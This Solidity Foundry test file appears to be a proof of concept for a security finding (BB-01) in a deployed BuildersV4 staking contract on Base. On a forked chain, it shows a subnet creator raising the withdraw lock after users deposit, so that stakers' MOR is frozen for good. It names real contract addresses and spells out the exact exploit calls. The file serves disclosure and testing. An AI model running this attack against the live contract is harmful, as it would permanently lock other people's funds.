// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console, stdError} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

/// @notice Minimal interface of deployed BuildersV4 (Base proxy
/// 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, impl 0x18faef315b40a6d9cf49628f1133b1aa507513b0)
interface IBuildersV4Minimal {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
    function usersData(address user_, bytes32 subnetId_)
        external
        view
        returns (uint128 lastDeposit, uint128 unused1, uint256 deposited, uint256 unused2);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

/// @title BB-01 — Subnet admin can permanently lock all stakers' MOR after deposits
/// @notice BuildersV4.editSubnet() has NO time restriction and NO upper bound on
///         withdrawLockPeriodAfterDeposit (only >= minimalWithdrawLockPeriod, 7 days).
///         The withdraw check reads the LIVE value, so an admin can raise the lock to
///         type(uint128).max AFTER users have deposited, freezing their MOR forever.
///         V3 prevented this: editBuilderPool required block.timestamp + editPoolDeadline
///         < poolStart (edits only before the pool started). V4 removed the guard.
///         Attacker = any permissionless subnet creator (self-granted "admin" role);
///         no protocol owner / multisig involvement needed.
contract BuildersV4AdminLockTest is Test {
    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    IBuildersV4Minimal builders = IBuildersV4Minimal(BUILDERS);
    IERC20 mor = IERC20(MOR);

    address attacker = makeAddr("attacker-admin");
    address victim = makeAddr("victim-staker");
    address controlAdmin = makeAddr("control-admin");
    address controlVictim = makeAddr("control-victim");

    uint256 constant STAKE = 1000 ether; // 1000 MOR
    uint256 constant MIN_LOCK = 7 days; // == minimalWithdrawLockPeriod on-chain

    bytes32 evilId;
    bytes32 controlId;

    function setUp() public {
        vm.createSelectFork("base", 59_604_000);

        // fund both victims with real MOR (fork state, no live tx)
        deal(MOR, victim, STAKE);
        deal(MOR, controlVictim, STAKE);

        // --- attacker creates a subnet, admin = attacker ---
        vm.startPrank(attacker);
        IBuildersV4Minimal.Subnet memory evil = IBuildersV4Minimal.Subnet({
            name: "EVIL-BUILDER",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(MIN_LOCK),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        builders.createSubnet(evil, IBuildersV4Minimal.SubnetMetadata("", "", "", ""));
        vm.stopPrank();
        evilId = builders.getSubnetId("EVIL-BUILDER");

        // --- control subnet, never edited ---
        vm.startPrank(controlAdmin);
        IBuildersV4Minimal.Subnet memory ctrl = IBuildersV4Minimal.Subnet({
            name: "CONTROL-BUILDER",
            admin: controlAdmin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(MIN_LOCK),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: controlAdmin
        });
        builders.createSubnet(ctrl, IBuildersV4Minimal.SubnetMetadata("", "", "", ""));
        vm.stopPrank();
        controlId = builders.getSubnetId("CONTROL-BUILDER");

        // --- both victims stake ---
        vm.startPrank(victim);
        mor.approve(BUILDERS, STAKE);
        builders.deposit(evilId, STAKE);
        vm.stopPrank();

        vm.startPrank(controlVictim);
        mor.approve(BUILDERS, STAKE);
        builders.deposit(controlId, STAKE);
        vm.stopPrank();
    }

    function test_controlWithdrawWorksAfterLock() public {
        vm.warp(block.timestamp + 8 days);
        uint256 before = mor.balanceOf(controlVictim);
        vm.prank(controlVictim);
        builders.withdraw(controlId, STAKE);
        assertEq(mor.balanceOf(controlVictim) - before, STAKE, "control withdraw must work");
    }

    function test_adminRaisesLockAfterDeposit_locksVictimForever() public {
        // sanity: victim could withdraw after the original 7-day lock
        vm.warp(block.timestamp + 8 days);

        // --- attacker edits the subnet AFTER the victim deposited ---
        // No timelock, no upper bound: lock -> 1000 years
        vm.startPrank(attacker);
        IBuildersV4Minimal.Subnet memory evil = IBuildersV4Minimal.Subnet({
            name: "EVIL-BUILDER",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(365 days * 1000),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        builders.editSubnet(evilId, evil);
        vm.stopPrank();

        (,,, uint128 lockAfter,,,) = builders.subnets(evilId);
        assertEq(lockAfter, uint128(365 days * 1000), "lock must have been raised");

        // victim tries to withdraw: reverts even though original lock expired
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        builders.withdraw(evilId, STAKE);

        // ... and still locked 100 years later (effectively permanent)
        vm.warp(block.timestamp + 365 days * 100);
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        builders.withdraw(evilId, STAKE);

        // victim funds are still sitting in BuildersV4, unrecoverable
        (,, uint256 stillDeposited,) = builders.usersData(victim, evilId);
        assertEq(stillDeposited, STAKE, "victim deposit still locked in contract");
        assertEq(mor.balanceOf(victim), 0, "victim got nothing back");
        assertEq(mor.balanceOf(BUILDERS) >= STAKE, true, "funds remain in BuildersV4");

        console.log("BB-01 CONFIRMED: victim 1000 MOR locked for 1000y by admin editSubnet");
    }

    function test_adminRaisesLockToMax_withdrawRevertsWithArithmeticPanic() public {
        // Strongest variant: lock = type(uint128).max.
        // `lastDeposit + withdrawLockPeriodAfterDeposit` overflows uint128 in
        // withdraw(), so the check reverts with panic 0x11 on EVERY call, forever
        // — not even the passage of time can ever unlock the funds.
        vm.startPrank(attacker);
        IBuildersV4Minimal.Subnet memory evil = IBuildersV4Minimal.Subnet({
            name: "EVIL-BUILDER",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        builders.editSubnet(evilId, evil);
        vm.stopPrank();

        vm.warp(block.timestamp + 365 days * 1000);
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError);
        builders.withdraw(evilId, STAKE);

        (,, uint256 stillDeposited,) = builders.usersData(victim, evilId);
        assertEq(stillDeposited, STAKE, "victim deposit still locked in contract");
    }

    function test_liveInvariant_totalDepositedEqualsMorBalance() public view {
        // on-chain accounting check at the fork block: no M-02-style drift
        // totalDeposited slot is read via the public getter through allSubnetsData
        (,, uint256 totalDeposited,) = IAllSubnets(BUILDERS).allSubnetsData();
        assertEq(totalDeposited, mor.balanceOf(BUILDERS), "totalDeposited must equal MOR balance");
    }
}

interface IAllSubnets {
    function allSubnetsData()
        external
        view
        returns (uint256 unused1, uint256 rate, uint256 totalDeposited, uint256 unused2);
}
